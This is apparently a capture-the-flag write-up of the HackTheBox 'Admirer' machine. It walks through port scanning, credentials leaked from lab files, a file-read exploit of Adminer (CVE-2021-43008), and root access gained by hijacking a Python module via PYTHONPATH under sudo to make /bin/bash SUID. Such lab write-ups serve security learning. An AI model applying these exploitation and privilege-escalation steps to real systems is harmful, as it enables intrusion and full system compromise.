---
description: Admirer box from HackTheBox write up.
---

# Admirer

## Nmap

You guessed it, Nmap time!

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate=1000 10.10.10.187  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 20:22 CET
Nmap scan report for 10.10.10.187
Host is up (0.039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 42.76 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 21,22,80 -sC -sV 10.10.10.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 20:26 CET
Nmap scan report for 10.10.10.187
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
|_  256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
```

Since I cannot really connect to the FTP server I will start with the port 80.

## Port 80

The first thing I noticed from the Nmap scan was the `robots.txt` file:
```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

I guess `waldo` could be a valid SSH user, Time for a directory bruteforce since the directory listing is disabled, I found these files:

```
# contacts.txt

##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

```
# credentials.txt

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

The FTP credentials are valid so let's take a look.

## FTP

I was able to get a backup of the site (or maybe an internal one). I found another "secret" directory with a new credential:

```
# w4ld0s_s3cr3t_d1r/credentials.txt

[Bank Account]
waldo.11
Ezy]m27}OREc$
```

Also found some credentials for databases:

```php
# index.php

$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

```php
# utility-scripts/db_admin.php

$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
```

I tried some of the passwords and users in SSH but no luck. The thing is that the file `utility-scripts/admin_task.php` exists in the live website and it is executing a script using `shell_exec`. Since it is not cleaning the input I believe I can get code execution by just changing a bit the form values.

```php
 if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?>
```

After a bit I was not able to execute a thing... I found `utility-scripts/adminer.php` though, I guess we can try to connect to the databases now.

## Adminer

Well nope, we cant get access to the databases. At least the Adminer version: 4.6.2 is vulnerable to CVE-2021-43008. Basically you can get access to files of the server connecting the Adminer panel to a SQL server you control.

Let's prepare the environment, using Docker I started a server in my machine:

```yaml
version: '3.3'
services:
  db:
    image: mysql:5.7
    environment:
      MYSQL_DATABASE: 'lfr_sink_db'
      # So you don't have to use root, but you can if you like
      MYSQL_USER: 'user'
      # You can use whatever password you like
      MYSQL_PASSWORD: 'password'
      # Password for root access
      MYSQL_ROOT_PASSWORD: 'password'
    ports:
      # <Port exposed> : < MySQL Port running inside container>
      - '3306:3306'
    expose:
      # Opens port 3306 on the container
      - '3306'

```

I had to connect to it through Adminer and create a new table called `lfr_sink_table` to make sure the tool I want to use (More on it later) works properly:

```sql
CREATE TABLE IF NOT EXISTS lfr_sink_table (a varchar(255));
```

I found [this tool](https://github.com/p0dalirius/CVE-2021-43008-AdminerRead) to ease the exploitation. I noticed that I was not able to access all files I want BUT I can retrieve files from the webserver itself:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Admirer/CVE-2021-43008-AdminerRead]
└─$ python3 AdminerRead.py -t http://10.10.10.187/utility-scripts/adminer.php -I 10.10.14.55 -P 3306 -u root -p password -f /var/www/html/index.php
     _       _           _                 ____                _
    / \   __| |_ __ ___ (_)_ __   ___ _ __|  _ \ ___  __ _  __| |
   / _ \ / _` | '_ ` _ \| | '_ \ / _ \ '__| |_) / _ \/ _` |/ _` |
  / ___ \ (_| | | | | | | | | | |  __/ |  |  _ <  __/ (_| | (_| |
 /_/   \_\__,_|_| |_| |_|_|_| |_|\___|_|  |_| \_\___|\__,_|\__,_|   v1.1.0
                                                                 
[>] Remote Adminer version : v4.6.2

[+] (  4.52 kB) /var/www/html/index.php
```

Inside that file, I found again credentials for a database but the password is different. I tried it in SSH and we are in!

```php
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

## Pwned!

Check this, maybe we can abuse this `sudo` configuration.

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Can't abuse path injection in the script but I noticed it is calling a python script in one of the options:

```
backup_web() --> /opt/scripts/backup.py
```

Checking the Python script I can try to inject a custom `make_archive` funtion modifying `PYTHONPATH` variable.

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

I created this little Python script, the idea is that the website backup task will run this code instead of the intended one and make the `/bin/bash` binary a SUID binary.

```bash
waldo@admirer:~$ cat shutil.py 
import os

def make_archive(param1, param2, param3):
	os.system('chmod u+s /bin/bash')
```

Now we can execute the web backup task and we are `root`!

```bash
waldo@admirer:~$ sudo PYTHONPATH=/home/waldo/ /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:~$ bash -p
bash-4.4#
```
